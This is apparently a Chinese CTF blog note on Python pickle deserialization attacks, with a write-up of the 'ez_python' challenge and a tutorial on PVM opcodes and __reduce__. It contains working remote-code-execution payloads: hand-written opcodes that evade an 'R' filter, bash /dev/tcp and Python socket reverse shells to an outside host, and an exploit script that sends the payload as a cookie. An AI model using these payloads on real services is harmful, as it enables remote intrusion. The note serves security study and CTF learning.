---
title: "python 反序列化"
date: 2021-10-20 00:00:00
updated: 2022-06-30 22:43:04
tags:
  - ctf
description: "笔记"
---

# 长城杯ez_python复盘

就看了一题 md网刃和极客都没做，亏

先解题放payload

[pickle反序列化初探 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7436#toc-7)

[https://github.com/EddieIvan01/pker](https://github.com/EddieIvan01/pker)

[pickle反序列化的利用技巧总结 – 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/361349643)

[Python 反序列化漏洞学习笔记 – 1ndex- – 博客园 (cnblogs.com)](https://www.cnblogs.com/wjrblogs/p/14057784.html)

[pickle反序列化初探 – 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7436)

[(28条消息) 极客巅峰2021 web opcode_y0un9er-CSDN博客](https://blog.csdn.net/CSDNiamcoming/article/details/119284636)

## ez_python

pic处可以读源码

```
import pickle
import base64
from flask import Flask, request
from flask import render_template,redirect,send_from_directory
import os
import requests
import random
from flask import send_file

app = Flask(__name__)

class User():
    def __init__(self,name,age):
        self.name = name
        self.age = age

def check(s):
    if b'R' in s:
        return 0
    return 1


@app.route("/")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
        if check(user):
            user = pickle.loads(user)
            username = user["username"]
        else:
            username = "bad,bad,hacker"
    except:
        username = "CTFer"
    pic = '{0}.jpg'.format(random.randint(1,7))
    
    try:
        pic=request.args.get('pic')
        with open(pic, 'rb') as f:
            base64_data = base64.b64encode(f.read())
            p = base64_data.decode()
    except:
        pic='{0}.jpg'.format(random.randint(1,7))
        with open(pic, 'rb') as f:
            base64_data = base64.b64encode(f.read())
            p = base64_data.decode()

    return render_template('index.html', uname=username, pic=p )


if __name__ == "__main__":
    app.run('0.0.0.0',port=5000)
```

序列化字符串中不能存在 R，而 **reduce** 就是用到了R指令，不过也毫不意外，毕竟题目提示的就是要手写 opcode，在不使用 R 指令的情况下执行命令

```
bash -c "bash -i >& /dev/tcp/ip/port 0>&1"

http://www.jackson-t.ca/runtime-exec-payloads.html//编码网站

bash -c {echo,base64==}|{base64,-d}|{bash,-i}
```

RCE demo:

R:

```
b'''cos
system
(S'whoami'
tR.'''
```

i

```
b'''(S'whoami'
ios
system
.'''
```

o

```
b'''(cos
system
S'whoami'
o.'''
```

选一个没有b’R’的

exp:

```
import base64
import pickletools

a = b'''(S'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'
ios
system
.'''

a = pickletools.optimize(a)
print(base64.b64encode(a))
```

无过滤

```
#!/usr/bin/env python3
import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return (os.system, (s,))


e = exp()
s = pickle.dumps(e)

response = requests.get("http://172.19.0.2:8000/", cookies=dict(
    user=base64.b64encode(s).decode()
))

print(response.content)
```

草草草我怎么这么菜？？？？？我居然找不到opcode的，，呜呜呜我连百度都不会

## **Python 的序列化和反序列化是什么**

Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。

```
import pickle
class People(object):
    def __init__(self,name = "K0rz3n"):
        self.name = name

    def say(self):
        print ("Hello ! My friends")

a=People()
c=pickle.dumps(a)
print (c)

#output:b'\x80\x04\x95.\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06People\x94\x93\x94)\x81\x94}\x94\x8c\x04name\x94\x8c\x06K0rz3n\x94sb.'
import pickle
class People(object):
    def __init__(self,name = "K0rz3n"):
        self.name = name

    def say(self):
        print ("Hello ! My friends")

a=People()
c=pickle.dumps(a)
d = pickle.loads(c)
print(type(d))
d.say()
# 可以看到，我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法
# output:<class '__main__.People'>
# Hello ! My friends
import pickle
class People(object):
    def __init__(self,name = "K0rz3n"):
        self.name = name

    def say(self):
        print ("Hello ! My friends")

a=People()
c=pickle.dumps(a)
del People
d = pickle.loads(c)
# 如果我在反序列化以前删除了 People
# 这个类，那么我们在反序列化的过程中因为对象在当前的运行环境中没有找到这个类就会报错，从而反序列化失败。
# nootput,die
```

## **为什么要实现序列化和反序列化**

和其他语言的序列化一样，Python 的序列化的目的也是为了保存、传递和恢复对象的方便性，在众多传递对象的方式中，序列化和反序列化可以说是最简单和最容易试下的方式

## **python 是怎么实现序列化和反序列化的**

### **1.几个重要的函数**

库 pickle 和 cPickle 后者更快

**序列化：**

```
pickle.dump(文件) 
pickle.dumps(字符串)
```

**反序列化:**

```
pickle.load(文件)
pickle.loads(字符串)
```

PVM(python 虚拟机)是实现 Python 序列化和反序列化的最根本的东西

### **2.PVM 的组成**

PVM 由三个部分组成，引擎（或者叫指令分析器），栈区、还有一个 Memo (作者也不知道怎么解释，我们姑且叫它 “标签区“)

#### **1.引擎的作用**

从头开始读取流中的操作码和参数，并对其进行处理,zai在这个过程中改变 栈区 和 标签区，处理结束后到达栈顶，形成并返回反序列化的对象

#### **2.栈区的作用**

作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化，并最终在栈上生成发序列化的结果

#### **3.标签区的作用**

数据的一个索引或者标记

### **3.PVM 操作码**

图挂了草草草

**这里面要重点关注几个**

S : 后面跟的是字符串 ( ：作为命令执行到哪里的一个标记 t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中 c ：定义模块名和类名（模块名和类名之间使用回车分隔） R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中 . ：点号是结束符

### **4.反序列化流程**

序列化就是一个将对象转化成字符串的过程

我们将下面这个字符串存储为一个文件 shell.pickle

```
cos
system
(S'/bin/sh'
tR.
```

当我们使用下面这个函数对其进行加载的时候

```
>>> import pickle
>>> pickle.load(open('shell.pickle'))

# 这边失败了报了个typeerror 给的不是字节编码解析成str了
```

解释如何执行

```
(1)c 后面是模块名，换行后是类名,于是将 os.system 放入栈中
(2)( 这个是标记符，我们将一个 Mark 放入栈中
(3)S 后面是字符串，我们放入栈中
(4)t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （’/bin/sh’,），同时标记 Mark 消失
(5)R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘/bin/sh’),然后将结果再存入栈中
```

## **与 PHP 反序列化的对比**

Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。

## **Python 反序列化漏洞何来**

### **我们怎么利用反序列化漏洞**

#### **1.理论基础**

`__reduce__` 这个魔法方法

当序列化以及反序列化的过程中中碰到一无所知的扩展类型(**这里指的就是新式类**)的时候，可以通过类中定义的`__reduce__`方法来告知如何进行序列化或者反序列化

只要在新式类中定义一个 `__reduce__` 方法，我们就能在序列化的使用让这个类根据我们在`__reduce__` 中指定的方式进行序列化

关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候

当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 `__reduce__` 方法的返回值的底层实现 ）所以这过滤R就不能用reduce了

```
import pickle
import os
class A(object):
    def __reduce__(self):
        a = 'ping 127.0.0.1'
        return (os.system,(a,))
a = A()
test = pickle.dumps(a)
pickle.loads(test)

# output:执行的命令
```

一个比较好的命令能执行 系统命令，那就是 python pty 模块

reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable

这时候就要利用我们上面分析的那个 PVM 操作码来自己构造了

这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数，这一部分的内容可以看[官方文档](https://docs.python.org/3/library/types.html)的介绍

**这里直接给出 payload**

这是什么鬼。。。。？？？？

```
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMHAAAAcGljNC5weVIBAAAABwAAAHMGAAAAAAEMAQQBcwkAAABmaWIoMTApID1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMHAAAAcGljNC5weXQDAAAAZm9vBQAAAHMIAAAAAAEMAQ8EDwE='
tRtRc__builtin__
globals
(tRS''
tR(tR.
```
